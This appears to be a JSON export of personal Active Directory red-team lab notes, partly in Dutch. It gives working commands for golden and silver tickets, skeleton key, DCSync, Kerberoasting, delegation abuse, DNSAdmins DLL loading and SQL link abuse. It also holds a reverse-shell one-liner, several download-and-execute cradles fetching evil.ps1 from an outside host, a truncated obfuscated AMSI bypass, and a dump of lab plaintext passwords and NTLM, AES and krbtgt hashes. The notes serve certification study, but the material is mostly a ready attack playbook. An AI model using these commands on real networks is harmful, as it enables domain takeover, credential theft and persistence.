Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''')'\"\n\nschtasks /Run /S <target> /TN “Reverse”\n```\n\n#### Make silver ticket for WMI\nExecute for WMI /service:HOST /service:RPCSS\n```\nInvoke-Mimikatz -Command '\"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt\"'\n\nInvoke-Mimikatz -Command '\"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt\"'\n```\n\n#### Check WMI Permission\n```\nGet-wmiobject -Class win32_operatingsystem -ComputerName <target>\n```\n\n## Skeleton key\nDe skeleton key attack is een aanval dat malware in het geheugen laad van de domain controller. Waarna het mogelijk is om als elke user the authenticeren met een master wachtwoord. Als je dit met mimikatz uitvoert is dit wachwoord 'mimikatz'. Dit laad een grote security gat waarbij dit wordt uitgevoerd! Voer dit dus niet uit in een productieomgeving zonder goed te overleggen met de klant. Om deze aanval te stoppen moet de domain controller worden herstart.\n\nhttps://pentestlab.blog/2018/04/10/skeleton-key/\n\n#### Create the skeleton key - Requires DA\n```\nInvoke-MimiKatz -Command '\"privilege::debug\" \"misc::skeleton\"' -Computername <target>\n```\n\n## DSRM\nDe Directory Services Restore Mode is een boot option waarin een domain controller kan worden opgestart zodat een administrator reparaties of een recovery kan uitvoeren op de active directory database. Dit wachtwoord wordt ingesteld tijdens het installeren van de domain controller en wordt daarna bijna nooit gewijzigd. Door de login behavior aan te passen van dit lokale account is het mogelijk om remote toegang te verkrijgen via dit account, een account waarvan het wachtwoord bijna nooit wijzigd! Pas op, dit tast de security van de domain controller aan!\n\n#### Dump DSRM password - dumps local users\nlook for the local administrator password\n```\nInvoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername <target>\n```\n\n#### Change login behavior for the local admin on the DC\n```\nNew-ItemProperty “HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD\n```\n\n#### If property already exists\n```\nSet-ItemProperty “HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\” -Name “DsrmAdminLogonBehavior” -Value 2\n```\n\n#### Pass the hash for local admin\n```\nInvoke-Mimikatz -Command '\"sekurlsa::pth /domain:<computer> /user:Administrator /ntlm:<hash> /run:powershell.exe\"'\n```\n\n## Custom SSP - Track logons\nHet is mogelijk om met een custom Security Support Provider (SSP) alle logons op een computer bij te houden. Een SSP is een DDL. Een SSP is een DLL waarmee een applicatie een geverifieerde verbinding kan verkrijgen. Sommige SSP-pakketten van Microsoft zijn: NTLM, Kerberos, Wdigest, credSSP. \n\nMimikatz biedt een aangepaste SSP - mimilib.dll aan. Deze SSP registreert lokale aanmeldingen, serviceaccount- en computeraccountwachtwoorden in platte tekst op de doelserver.\n\n#### Mimilib.dll\nDrop mimilib.dll to system32 and add mimilib to HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\n```\n$packages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'\n$packages += \"mimilib\"\nSetItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name 'Security Packages' -Value $packages\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name 'Security Packages' Value $packages\n```\n\n#### Use mimikatz to inject into lsass\nall logons are logged to C:\\Windows\\System32\\kiwissp.log\n```\nInvoke-Mimikatz -Command ‘”misc:memssp”’\n```\n\n## ACL\n### AdminSDHolder\nDe AdminSDHolder container is een speciale AD container met default security permissies die gebruikt worden als template om beveiligde AD gebruikers en groepen (Domain Admins, Enterprise Admins etc.) te beveiligen en te voorkomen dat hier onbedoeld wijzingen aan worden uitgevoerd. Nadater er toegang is verkregen tot een DA is het mogelijk om deze container aan te passen voor persistence.\n\nhttps://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence\n\n#### Check if student has replication rights\n```\nGet-ObjectAcl -DistinguishedName \"dc=dollarcorp,dc=moneycorp,dc=local\" -ResolveGUIDs | ? {($_.IdentityReference -match \"<username>\") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}\n```\n\n#### Add fullcontrol permissions for a user to the adminSDHolder\n```\nAdd-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAccountName <username> -Rights All -Verbose\n```\n\n#### Run SDProp on AD (Force the sync of AdminSDHolder)\n```\nInvoke-SDPropagator -showProgress -timeoutMinutes 1\n\n#Before server 2008\nInvoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose\n```\n\n#### Check if user got generic all against domain admins group\n```\nGet-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}\n```\n\n#### Add user to domain admin group\n```\nAdd-DomainGroupMember -Identity ‘Domain Admins’ -Members <username> -Verbose\n```\n\nor\n\n```\nNet group \"domain admins\" sportless /add /domain\n```\n\n#### Abuse resetpassword using powerview_dev\n```\nSet-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force ) -Verbose\n```\n\n### DCsync\nBij een DCSync aanval immiteren we een DC om de wachtwoorden te achterhalen via domain replication. Hiervoor hebben we bepaalde rechten nodig op de domain controller.\n\nhttps://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync\nhttps://blog.stealthbits.com/what-is-dcsync-an-introduction/\n\n#### Add full-control rights\n```\nAdd-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose\n```\n\n#### Add rights for DCsync\n```\nAdd-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose\n```\n\n#### Execute DCSync and dump krbtgt\n```\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:<domain>\\krbtgt\"'\n```\n\n### SecurityDescriptor - WMI\n```\n. ./Set-RemoteWMI.ps1\n```\n\n#### On a local machine\n```\nSet-RemoteWMI -Username <username> -Verbose\n```\n\n#### On a remote machine without explicit credentials\n```\nSet-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\\cimv2’ -Verbose\n```\n\n#### On a remote machine with explicit credentials\nOnly root/cimv and nested namespaces\n```\nSet-RemoteWMI -Username <username> -Computername <computername> -Credential Administrator -namespace ‘root\\cimv2’ -Verbose\n```\n\n#### On remote machine remove permissions\n```\nSet-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\\cimv2’ -Remove -Verbose\n```\n\n#### Check WMI permissions\n```\nGet-wmiobject -Class win32_operatingsystem -ComputerName <computername>\n```\n\n### SecurityDescriptor - Powershell Remoting\n```\n. ./Set-RemotePSRemoting.ps1\n```\n\n#### On a local machine\n```\nSet-RemotePSRemoting -Username <username> -Verbose\n```\n\n#### On a remote machine without credentials\n```\nSet-RemotePSRemoting -Username <username> -Computername <computername> -Verbose\n```\n\n#### On a remote machine remove permissions\n```\nSet-RemotePSRemoting -Username <username> -Computername <computername> -Remove\n```\n\n### SecurityDescriptor - Remote Registry\nUsing the DAMP toolkit\n```\n. ./Add-RemoteRegBackdoor\n. ./RemoteHashRetrieval\n```\n\n#### Using DAMP with admin privs on remote machine\n```\nAdd-RemoteRegBackdoor -Computername <computername> -Trustee <username> -Verbose\n```\n\n#### Retrieve machine account hash from local machine\n```\nGet-RemoteMachineAccountHash -Computername <computername> -Verbose\n```\n\n#### Retrieve local account hash from local machine\n```\nGet-RemoteLocalAccountHash -Computername <computername> -Verbose\n```\n\n#### Retrieve domain cached credentials from local machine\n```\nGet-RemoteCachedCredential -Computername <computername> -Verbose\n```\n# Domain Privilege escalation\n## Kerberoast\nKerberoasting een technique waarbij de wachtwoorden van service accounts worden gekraakt. Kerberoasting is voornamelijk efficient indien er user accounts als service accounts worden gebruikt. Een TGS ticket kan worden aangevraagd voor deze user, waarbij de TGS versleuteld is met de NTLM hash van de plaintext wachtwoord van de gebruiker. Als de service account een user account is welke zelf is aangemaakt door de beheerder is de kans groter dat deze ticket te kraken is, en dus het wachtwoord wordt achterhaalt voor de service. Deze TGS ticket kan offline gekraakt worden. Voor de aanval word de kerberoas[https://github.com/nidem/kerberoast] repositorie van Nidem gebruikt.\n#### Find user accounts used as service accounts\n\n```\n. ./GetUserSPNs.ps1\n```\n\n```\nGet-NetUser -SPN\n```\n\n```\nGet-NetUser -SPN | select samaccountname,serviceprincipalname\n```\n\n#### Reguest a TGS\n```\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\"\n```\nor\n```\nRequest-SPNTicket \"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\"\n```\n\n#### Export ticket using Mimikatz\n```\nInvoke-Mimikatz -Command '\"Kerberos::list /export\"'\n```\n\n#### Crack the ticket\nCrack the password for the serviceaccount\n```\npython.exe .\\tgsrepcrack.py .\\10k-worst-pass.txt .\\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi\n```\n\n```\n.\\hashcat.exe -m 18200 -a 0 <HASH FILE> <WORDLIST>\n```\n\n## AS-REPS Roasting\nAS-REPS roasting is een technique waarbij het wachtwoord achterhaald kan worden omdat de 'Do not require Kerberos preauthentication property' is aangezet, oftewel kerberos preauthentication staat uit. Een aanvaller kan de eerste stap van authenticatie overslaan en voor deze gebruiker een TGT aanvragen, welke vervolgens offline gekraakt kan worden.\n#### Enumerating accounts with kerberos preauth disabled\n```\n. .\\Powerview_dev.ps1\nGet-DomainUser -PreauthNotRequired -Verbose\n```\n```\nGet-DomainUser -PreauthNotRequired -verbose | select samaccountname\n```\n\n#### Enumerate permissions for group\nMet genoeg rechten(GenericWrite of GenericAll) is het mogelijk om kerberos preauth uit te schakelen.\n```\nInvoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}\nInvoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl\n```\n\n#### Set preauth not required\n```\n. ./PowerView_dev.ps1\nSet-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose\n```\n\n#### Request encrypted AS-REP\n```\n. ./ASREPRoast.ps1\nGet-ASREPHash -Username <username> -Verbose\n```\n\n#### Enumerate all users with kerberos preauth disabled and request a hash\n```\nInvoke-ASREPRoast -Verbose\nInvoke-ASREPRoast -Verbose | fl\n```\n\n#### Crack the hash with hashcat\nEdit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......\n```\nHashcat -a 0 -m 18200 hash.txt rockyou.txt\n```\n\n## Set SPN\nMet genoeg rechten (GenericALL en GenericWrite) is het mogelijk om zelf de Service Principle Name attribute aan een gebruiker toe te voegen. Deze kan dan worden gekraakt met behulp van kerberoasting.\n\n#### Enumerate permissions for group on ACL\n```\nInvoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}\nInvoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl\n```\n\n#### Check if user has SPN\n```\n. ./Powerview_dev.ps1\nGet-DomainUser -Identity <username> | select samaccountname, serviceprincipalname\n```\n\nof\n\n```\nGet-NetUser | Where-Object {$_.servicePrincipalName}\n```\n\n#### Set SPN for the user\n```\n. ./PowerView_dev.ps1\nSet-DomainObject -Identity <username> -Set @{serviceprincipalname=’ops/whatever1’}\n```\n\n#### Request a TGS\n```\nAdd-Type -AssemblyName System.IdentityModel \nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"ops/whatever1\"\n```\n\n#### Export ticket to disk for offline cracking\n```\nInvoke-Mimikatz -Command '\"Kerberos::list /export\"'\n```\n\n#### Request TGS hash for offline cracking hashcat\n```\nGet-DomainUser -Identity <username> | Get-DomainSPNTicket | select -ExpandProperty Hash\n```\n\n#### Crack the hash with hashcat\nEdit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......\n```\nHashcat -a 0 -m 18200 hash.txt rockyou.txt\n```\n\n## Unconstrained Delegation\nUnconstrained delegation is een privilege welke kan worden toegekent aan gebruikers of computers, dit gebeurt bijna altijd bij computers met services zoals ISS en MSSQL. Deze services hebben meestal toegang nodig tot een backend database namens de geverifieerde gebruiker. Wanneer een gebruiker zich verifieert op een computer waarop onbeperkt Kerberos-delegatierecht is ingeschakeld, wordt het geverifieerde TGT-ticket van de gebruiker opgeslagen in het geheugen van die computer. Als je administrator toegang hebt tot deze server, is het mogelijk om alle TGT tickets uit het geheugen te dumpen.\n\n#### Discover domain computers which have unconstrained delegation\nDomain Controllers always show up, ignore them\n```\n . .\\PowerView_dev.ps1\nGet-Netcomputer -UnConstrained\nGet-Netcomputer -UnConstrained | select samaccountname\n```\n\n#### Check if any DA tokens are available on the unconstrained machine\nWait for a domain admin to login while checking for tokens\n```\nInvoke-Mimikatz -Command '\"sekurlsa::tickets\"'\n```\n\n#### Export the TGT ticket\n```\nInvoke-Mimikatz -Command '\"sekurlsa::tickets /export\"'\n```\n\n#### Reuse the TGT ticket\n```\nInvoke-Mimikatz -Command '\"kerberos::ptt <kirbi file>\"'\n```\n\n## Constrained Delegation\nAls je over een account of computer beschikt met de constrained delegation privilege is het mogelijk om je voor te doen als elk andere gebruiker en jezelf te authentiseren naar een service waar de gebruiker mag delegeren.\n### Enumerate\n#### Enumerate users with contrained delegation enabled\n```\nGet-DomainUser -TrustedToAuth\nGet-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto\n```\n\n#### Enumerate computers with contrained delegation enabled\n```\nGet-Domaincomputer -TrustedToAuth\nGet-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto\n```\n### Constrained delegation User\n#### Requesting TGT with kekeo\n```\n./kekeo.exe\nTgt::ask /user:<username> /domain:<domain> /rc4:<hash>\n```\n\n#### Requesting TGS with kekeo\n```\nTgs::s4u /tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local\n```\n\n#### Use Mimikatz to inject the TGS ticket\n```\nInvoke-Mimikatz -Command '\"kerberos::ptt <kirbi file>\"'\n```\n\n### Constrained delegation Computer\n#### Requesting TGT with a PC hash\n```\n./kekeo.exe\nTgt::ask /user:dcorp-adminsrv$ /domain:<domain> /rc4:<hash>\n```\n\n#### Requesting TGS\nNo validation for the SPN specified\n```\nTgs::s4u /tgt:<kirbi file> /user:Administrator@<domain> /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL\n```\n\n#### Using mimikatz to inject TGS ticket and executing DCsync\n```\nInvoke-Mimikatz -Command '\"Kerberos::ptt <kirbi file>\"'\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:<shortdomain>\\krbtgt\"'\n```\n\n## DNS Admins\nIndien je over een gebruiker bezit die lid is van de 'DNS admin' is het mogelijk om verschillende aanvallen uit te voeren op de DNS server (Meestal Domain Controller) Het is mogelijk om hier een reverse shell mee te krijgen, maar dit legt heel het DNS verkeer plat binnen het domein aangezien dit de DNS service bezighoudt! Voor meer informatie zie [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise]\n#### Enumerate member of the DNS admin group\n```\nGet-NetGRoupMember “DNSAdmins”\n```\n\n#### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)\nShare the directory the ddl is in for everyone so its accessible.\nlogs all DNS queries on C:\\Windows\\System32\\kiwidns.log \n```\nDnscmd <dns server> /config /serverlevelplugindll \\\\<ip>\\dll\\mimilib.dll\n```\n\n#### Restart DNS\n```\nSc \\\\<dns server> stop dns\nSc \\\\<dns server> start dns\n```\n\n## Enterprise Admins\n### Child to parent - trust tickets\n#### Dump trust keys\nLook for in trust key from child to parent (first command) - This worked best for me! Second command didnt work :(\nLook for NTLM hash (second command)\n```\nInvoke-Mimikatz -Command '\"lsadump::trust /patch\"' -Computername <computername>\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:<domain>\\<computername>$\"'\n```\n\n#### Create an inter-realm TGT\n```\nInvoke-Mimikatz -Command '\"Kerberos::golden /user:Administrator /domain:<domain> /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<trust hash> /service:krbtgt /target:<target domain> /ticket:<path to save ticket>\"'\n```\n\n#### Create a TGS for a service (kekeo_old)\n```\n./asktgs.exe <kirbi file> CIFS/<forest dc name>\n```\n\n#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old)\n```\n./kirbikator.exe lsa .\\<kirbi file>\n```\n\n#### Check access to server\n```\nls \\\\<servername>\\c$ \n```\n\n### Child to parent - krbtgt hash\n#### Get krbtgt hash from dc\n```\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -Computername <computername>\n```\n\n#### Create TGT\nthe mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group\n```\nInvoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>\"'\n```\n\n#### Inject the ticket\n```\nInvoke-Mimikatz -Command '\"kerberos::ptt <path to ticket>\"'\n```\n\n#### Get SID of enterprise admin\n```\nGet-NetGroup -Domain <domain> -GroupName \"Enterprise Admins\" -FullData | select samaccountname, objectsid\n```\n\n## Crossforest attacks\n### Trust flow\n#### Dump trust keys\nLook for in trust key from child to parent (first command)\nLook for NTLM hash (second command)\n```\nInvoke-Mimikatz -Command '\"lsadump::trust /patch\"' -Computername <computername>\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\mcorp$\"'\n```\n\n#### Create a intern-forest TGT\n```\nInvoke-Mimikatz -Command '\"kerberos::golden /user:Administrator /domain:<domain> /sid:<domain sid> /rc4:<hash of trust> /service:krbtgt /target:<target> /ticket:<path to save ticket>\"'\n```\n\n#### Create a TGS for a service (kekeo_old)\n```\n./asktgs.exe <kirbi file> CIFS/<crossforest dc name>\n```\n\n#### Use the TGT\n```\n./kirbikator.exe lsa <kirbi file>\n```\n\n#### Check access to server\n```\nls \\\\<servername>\\<share>\\\n```\n\n## Abuse SQL\n```\n. .\\PowerUpSQL.ps1\n```\n\n#### Discovery SPN scanning\n\n```\nGet-SQLInstanceDomain\n```\n\n#### Check accessibility\n```\nGet-SQLConnectionTestThreaded\nGet-SQLInstanceDomain | Get-SQLConnectionTestThreaded – Verbose\n```\n\n#### Gather information\n```\nGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose\n```\n\n#### Search for links to remote servers\n```\nGet-SQLServerLink -Instance <sql instance> -Verbose\n```\n\n#### Enumerate database links\n```\nGet-SQLServerLinkCrawl -Instance <sql instance> -Verbose\n```\n\n#### Enable xp_cmdshell\n```\nExecute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance>”\n```\n\n#### Execute commands\n```\nGet-SQLServerLinkCrawl -Instance <sql instance> -Query \"exec master..xp_cmdshell 'whoami'\"\n```\n\n#### Execute reverse shell example\n```\nGet-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query \"exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'\"\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/01-CRED/CRED",
    "path": "02-CRTP/01-CRED/CRED.md",
    "title": "CRED",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "FROM dcorp-mgmt ` mimikatz(commandline) sekurlsa::ekeys Authentication Id : 0 ; 56461 (00000000:0000dc8d) Session           : Service from 0 User Name         : svcadmin Domain            : dcorp Logo...",
    "category": "02-CRTP",
    "content": "## FROM dcorp-mgmt\n\n\n```\nmimikatz(commandline) # sekurlsa::ekeys\n\nAuthentication Id : 0 ; 56461 (00000000:0000dc8d)\nSession           : Service from 0\nUser Name         : svcadmin\nDomain            : dcorp\nLogon Server      : DCORP-DC\nLogon Time        : 2/20/2024 3:22:38 AM\nSID               : S-1-5-21-719815819-3726368948-3917688648-1118\n\n         * Username : svcadmin\n         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n         * Password : *ThisisBlasphemyThisisMadness!!\n         * Key List :\n           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011\n           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd\n           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8\n           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8\n           rc4_md4           b38ff50264b74508085d82c69794a4d8\n           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8\n           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8\n\n```\n\n## FROM dcorp-adminsrv\n\n\n\n```\nSession           : RemoteInteractive from 2\nUser Name         : srvadmin\nDomain            : dcorp\nLogon Server      : DCORP-DC\nLogon Time        : 2/20/2024 3:30:32 AM\nSID               : S-1-5-21-719815819-3726368948-3917688648-1115\n\n         * Username : srvadmin\n         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n         * Password : (null)\n         * Key List :\n           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4\n           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728\n           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728\n           rc4_md4           a98e18228819e8eec3dfa33cb68b0728\n           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728\n           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728\n\nAuthentication Id : 0 ; 91900 (00000000:000166fc)\nSession           : Service from 0\nUser Name         : websvc\nDomain            : dcorp\nLogon Server      : DCORP-DC\nLogon Time        : 2/20/2024 3:22:39 AM\nSID               : S-1-5-21-719815819-3726368948-3917688648-1114\n\n         * Username : websvc\n         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n         * Password : AServicewhichIsNotM3@nttoBe\n         * Key List :\n           aes256_hmac       2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7\n           aes128_hmac       86a353c1ea16a87c39e2996253211e41\n           rc4_hmac_nt       cc098f204c5887eaa8253e7c2749156f\n           rc4_hmac_old      cc098f204c5887eaa8253e7c2749156f\n           rc4_md4           cc098f204c5887eaa8253e7c2749156f\n           rc4_hmac_nt_exp   cc098f204c5887eaa8253e7c2749156f\n           rc4_hmac_old_exp  cc098f204c5887eaa8253e7c2749156f\n           \nAuthentication Id : 0 ; 91874 (00000000:000166e2)\nSession           : Service from 0\nUser Name         : appadmin\nDomain            : dcorp\nLogon Server      : DCORP-DC\nLogon Time        : 2/20/2024 3:22:39 AM\nSID               : S-1-5-21-719815819-3726368948-3917688648-1117\n\n         * Username : appadmin\n         * Domain   : DOLLARCORP.MONEYCORP.LOCAL\n         * Password : *ActuallyTheWebServer1\n         * Key List :\n           aes256_hmac       68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb\n           aes128_hmac       449e9900eb0d6ccee8dd9ef66965797e\n           rc4_hmac_nt       d549831a955fee51a43c83efb3928fa7\n           rc4_hmac_old      d549831a955fee51a43c83efb3928fa7\n           rc4_md4           d549831a955fee51a43c83efb3928fa7\n           rc4_hmac_nt_exp   d549831a955fee51a43c83efb3928fa7\n           rc4_hmac_old_exp  d549831a955fee51a43c83efb3928fa7\n```\n\n\n\n\n# From dcorp-dc\n```\n[dcorp-dc]: PS C:\\Users\\Administrator\\Documents> Invoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(powershell) # token::elevate\nToken Id  : 0\nUser name :\nSID name  : NT AUTHORITY\\SYSTEM\n\n628     {0;000003e7} 1 D 18436          NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Primary\n -> Impersonated !\n * Process Token : {0;00d7b318} 0 D 14136129    dcorp\\Administrator     S-1-5-21-719815819-3726368948-3917688648-500   (12g,26p)        Primary\n * Thread Token  : {0;000003e7} 1 D 14212710    NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)\n\nmimikatz(powershell) # lsadump::sam\nDomain : DCORP-DC\nSysKey : bab78acd91795c983aef0534e0db38c7\nLocal SID : S-1-5-21-627273635-3076012327-2140009870\n\nSAMKey : f3a9473cb084668dcf1d7e5f47562659\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd\n\nRID  : 000001f5 (501)\nUser : Guest\n\nRID  : 000001f7 (503)\nUser : DefaultAccount\n\nRID  : 000001f8 (504)\nUser : WDAGUtilityAccount\n```\n\n# UESR CRED\n\n```\nsvcadmin : 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011\n\n\nsrvadmin : 145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4\n\nwebsvc : 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7\n\nappadmin : 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb\n\nkrbtgt : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 :  4e9815869d2090ccfca61c1fe0d23986\n\nadministrator : a102ad5753f4c441e3af31c97fad86fd\n\nstudent222 : 9d4e8d0ab7594e61c51554ddb642352f1ed288cea9fa5af870cf5dd0dc954a2d : 471cb59916337404c45379d763fbf6cb\n```\n\n\n# Command for login\n\n### asktgt\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt\n```\n\n\ngolden \n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/01-Enumeration",
    "path": "02-CRTP/01-Enumeration.md",
    "title": "01 Enumeration",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Reference  exploit generator Active Directory Enuration || Red Team Codex - Users - Computers - Domain Administrators - Enterprise Administrators PowerShell Script Execution `powershell iex (New-Objec...",
    "category": "02-CRTP",
    "content": "\n## Reference \n[exploit generator](https://kickass101.github.io/RogueOps/#nav-inter-forest)\n[Active Directory Enuration || Red Team Codex](https://www.g0dmode.biz/active-directory-enumeration/user-enumeration)\n\n- Users\n- Computers\n- Domain Administrators\n- Enterprise Administrators\n\n## PowerShell Script Execution\n\n```powershell\niex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')\n```\n\n```powershell\n$ie=New-Object -ComObject\n\nInternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1\n\n');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response\n```\n\n```bash\nPSv3 onwards - iex (iwr 'http://192.168.230.1/evil.ps1')\n```\n\n```powershell\n$h=New-Object -ComObject\n\nMsxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex\n\n$h.responseText\n```\n\n```powershell\n$wr = [System.NET.WebRequest]::Create(\"http://192.168.230.1/evil.ps1\")\n\n$r = $wr.GetResponse()\n\nIEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()\n```\n\n\n## Port scan using powershell || nmap\n\n Scanning Domain Computers\n\n```bash\n. .\\Invoke-Portscan.ps1\nInvoke-portscan -Host fortress-dc.frotess.corp,fortress-secure.frotess.corp,fortress-mgmt.frotess.corp,fortress-privdb\n```\n\n\n## Firewall bypass \n\n- turn off firewall \n\n```powershell\nnetsh Advfirewall set allprofiles state off\n```\n\n- You would need to turn off Tamper Protection on the student VM after getting\n\n```powershell\nS`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  